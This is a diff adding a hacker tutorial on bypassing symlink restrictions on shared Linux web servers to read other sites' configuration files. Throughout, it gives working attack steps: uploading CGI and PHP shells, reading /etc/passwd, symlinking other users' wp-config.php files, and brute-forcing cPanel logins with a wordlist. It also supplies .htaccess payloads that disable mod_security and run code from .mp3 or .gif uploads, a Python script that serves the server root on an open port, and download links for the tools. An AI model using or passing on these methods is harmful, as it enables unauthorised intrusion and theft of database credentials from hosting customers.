@@ -1,3 +1,15 @@
+Hello Every One Now I Manoj Nath and I am going to share the Sen Haxor's Tutorial on Bypassing Symlink on 2013 Linux servers :)
+
+    Hi Guys this is Sen
+ Today i gonna Explain how to bypass Symlink on 2013 Server With Different .htaccess and Methods .
+So Lets Get Started :)
+Note : This method is not applicable for Godaddy , Bluehost , Hostgrator and Hostmonstor Servers .
+For This First You Need the Following Files :
+1 -> Sen Haxor CGI Shell
+2 -> sen.zip
+3 -> passwd-bypass.php
+4 -> Turbo Brute force Cpanel
+5 - > Port.py
 First Before Starting to symlink we need to create php.ini and ini.php to Disable Safe mode and Disabled Functions on the server .
 Use the Following Code :
 Make a php.ini with the following code
@@ -30,3 +42,218 @@ Archive:  sen.zip
 finishing deferred symbolic links:
   sen.txt                -> /
 This means a symbolic link has been created to / root .
+
+http://foto.pk/images/2rkr.jpg
+Now we need to upload .htaccess use the following
+Options all
+DirectoryIndex Sux.html
+AddType text/plain .php
+AddHandler server-parsed .php
+Done Bypassed Now View /var/www/vhost/ and you will be displayed with all sites .
+
+http://foto.pk/images/3twt.jpg
+BYPASSING SYMLINK ON APACHE AND LITESPEED
+Mostly when you try to symlink apache in 2013 server you will face 403 forbidden or 404 not found and 500 Internel Server Error
+These can be Bypass By Using Different .htaccess individually.
+BYPASSING SYMLINK ON APACHE & LITESPEED - Linux Servers .
+First for this make a new directory in your shell example sen then upload sen.sa and .htaccess from the Sen Haxor CGI shell which i added the download link at the end of the Tutorial
+After uploading .htaccess and sen.sa to a new directory sen chmod sen.sa to 0755
+Then Open the Cgi Shell Login ( Password : senhaxor)
+Now there are several methods to bypass 403 forbidden You need to try all the following methods . Atleast one will give you success .
+Method 1 : .shtml method
+This is the commonly used method by most of the hackers to bypass 403 forbidden Error .
+So before we procced first you need to get all /etc/passwd from the server so that we can find the username and path of where the sites are located .
+2013 Server mostly Many functions are enabled which shows 403 forbidden when you try to read cat /etc/passwd from the server
+so i made a Powerfull Shell which can bypass and get /etc/passwd from the server.
+I will also add it to the Downloads.
+Upload the /etc/passwd bypasser shell and get all /etc/passwd
+Then Login to Sen Haxor CGI Shell and create a symbolic link to your Target
+Step 1 : ln -s / root
+Step 2 : ln -s /home/username/public_html/config.php 1.shtml
+Example if our site is www.site.com and username is site and its Wordpress
+ln -s /home/site/public_html/wp-config.php 1.shtml
+So we created a Symbolic link to our Target now you need to Go to Your Shell and Edit the .htaccess with the following Code :
+Options +FollowSymlinks
+DirectoryIndex itti.html
+RemoveHandler .php
+AddType application/octet-stream .php
+Once you done this Open the 1.shtml on your Browser and rightclick and view source . You will be able to View the Config .
+This is the common way of Bypass 403 forbidden and Litespeed .
+Now Let Me Explain You the Advanced Method =)
+Method 2 : Bypassing Symlinked Config From Cpanel
+For This You need atleast One Cpanel Access on the sever . I will tell you how to easily crack Cpanel .
+First Run This Command : ls /var/mail
+Then you will be displayed with all username from the server Copy all .
+Now Upload Turbo Brute Force Cpanel Script ( i will attach it will the downloads).
+Open the Script and in User Paste all the username we got .
+And for Password here is the wordlist :
+
+http://pastebin.com/4kAjMvdy
+
+Copy All and Paste it on Password Select Simple and Click Submit
+If Your lucky you will be displayed with cracked cpanels.
+Once you got a cpanel on the server You can Bypass 500 Internel Server Error 403 Forbidden Error From Port :2077 and From error-pages from file manager.
+Just symlink the config
+ln -s /home/user/public_html/wp-config.php config.shtml
+Login to the cpanel
+Then Go to File Manager -> Error Pages
+Then Choose any of these according to what error is triggered when you open your symlinked config
+  400 (Bad request)
+    401 (Authorization required)
+    403 (Forbidden)
+    404 (Not found)
+    500 (Internal server error)
+Example "&file=400.shtml&desc=(Bad request)
+we can get the config by
+"&file=config.shtml& desc=(Bad request)
+BYPASS SYMLINK FROM PORT 2077
+So once you Symlinked the Config You can just login to port 2077
+Then public_html/path/config.shtml
+You will be able download the config.shtml and you can view the source .
+Method 3 : Symlink Bypass via Open Port using Python
+For this  First we Python to be Installed on Server.
+To check if Python is installed run this command python -h
+If its install we can use the following python script and Bypass
+#!/usr/bin/env python
+# devilzc0de.org (c) 2012
+import SimpleHTTPServer
+import SocketServer
+import os
+port = 13123
+if __name__=='__main__':
+os.chdir('/')
+Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+httpd = SocketServer.TCPServer(("", port), Handler)
+print("Now open this server on webbrowser at port : " + str(port))
+print("example: http://site.com :" + str(port))
+httpd.serve_forever()
+I have added the script to downloads .
+Now Upload the script to the shell
+
+http://foto.pk/images/205cjg3.jpg
+
+now run this command : python port.py
+
+http://foto.pk/images/2je1wqq.jpg
+
+Now Open the site with port 13123
+www.site.com:13123
+
+http://foto.pk/images/j5ifwm.jpg
+Server Bypassed From Open Port .
+Method 4 : Bypassing Symlink Using .ini Method
+Login to Sen Haxor CGI shell normally create a symlink to your target in .ini Extension .
+ln -s /home/user/public_html/wp-config.php config.ini
+now go to the shell and make a new file a.shtml
+Paste the following code inside it and save it
+<!--#include virtual="config.ini"-->
+and save it .
+Now open the a.shtml in the browser and right click and view the source . Done Bypassed
+Method 5 : Bypassing Symlink Using ReadMe file
+Make a new directory in your shell From the Cgi shell normally symlink the config
+ln -s /home/user/public_html/config.php config.txt
+now make .htaccess with the following code .
+.htaccess
+Options All
+ReadMeName config.txt
+Now when you open the directory on the browser you will be displayed with the config source directly .
+eg : site.com/sen/config.txt is your symlinked config then when you open
+www.site.com/sen/ you symlinked config will be displayed as a ReadMe content .
+ Thats it i have explain All the Methods to Bypass Symlink If you will have problem Bypassing Try all the Following .htaccess
+1 - > .htaccess
+Options Indexes FollowSymLinks
+DirectoryIndex ssssss.htm
+AddType txt .php
+AddHandler txt .php
+2 -> .htaccess
+Options All
+DirectoryIndex ssss.html
+addType txt .php
+AddHandler txt .php
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+3 -> .htaccess
+suPHP_ConfigPath /home/user/public_html/php.ini
+4 -> .htaccess
+Options +FollowSymLinks
+DirectoryIndex Sux.html
+Options +Indexes
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+5 -> .htaccess
+Options Indexes FollowSymLinks
+DirectoryIndex ssssss.htm
+AddType txt .php
+AddHandler txt .php
+<IfModule mod_autoindex.c>
+IndexOptions
+FancyIndexing
+IconsAreLinks
+SuppressHTMLPreamble
+</ ifModule>
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+
+.HTACCESS TO BYPASS DISABLED FUNCTIONS
+This one is to make python work :
+.htaccess
+AddType
+application/x-httpd-cgi .py
+AddHandler cgi-script .py
+AddHandler cgi-script .py
+
+This one is to make perl work :
+
+.htaccess
+AddType application/x-httpd-cgi .pl
+AddHandler cgi-script .pl
+AddHandler cgi-script .pl
+
+This one is to enable Symlink if the function is disabled in the server :
+
+.htaccess
+<Directory "/home"> *** Options -ExecCGI* ***
+AllowOverride
+AuthConfig Indexes
+Limit FileInfo
+Options=IncludesNOEXEC,Indexes,Includes,MultiViews ,SymLinksIfOwnerMatch,FollowSymLinks
+</ Directory>
+
+This one is to retrieve users permissions :
+
+.htaccess
+AddType text/plain .php
+Options +Indexes
+DirectoryIndex filename.html
+
+Bypass Internal Server error :
+.htaccess
+<IfModule mod_security.c> SecFilterEngine Off SecFilterScanPOST Off </IfModule>
+
+Change php version:
+.htaccess
+AddType application/x-httpd-php4 .php
+
+Bypass Uploads Options and upload shell in another extension :
+
+<FilesMatch "^.*\.mp3"> SetHandler application/x-httpd-php </FilesMatch>
+
+
+Retrieve Config with picture method :
+.htaccess
+Options FollowSymLinks MultiViews Indexes ExecCGI
+AddType application/x-httpd-cgi .gif
+AddHandler cgi-script .gif
+AddHandler cgi-script .gif
+DOWNLOAD LINK OF THE SCRIPTS I HAVE USED ON THE TUTORIAL :
+
+www.mediafire.com/download/08oeos9cpaloeum/Bypass_Symlink_on_2013_Server_With_Different_.htaccess_and_Methods_by_Sen_Haxor.rar
+
+So thats it i think i had covered everything thats related to Bypass Symlink and Disabled Functions on Server . If you still face Problem in Symlink Contact me :
+
+www.facebook.com/cheenu.vis
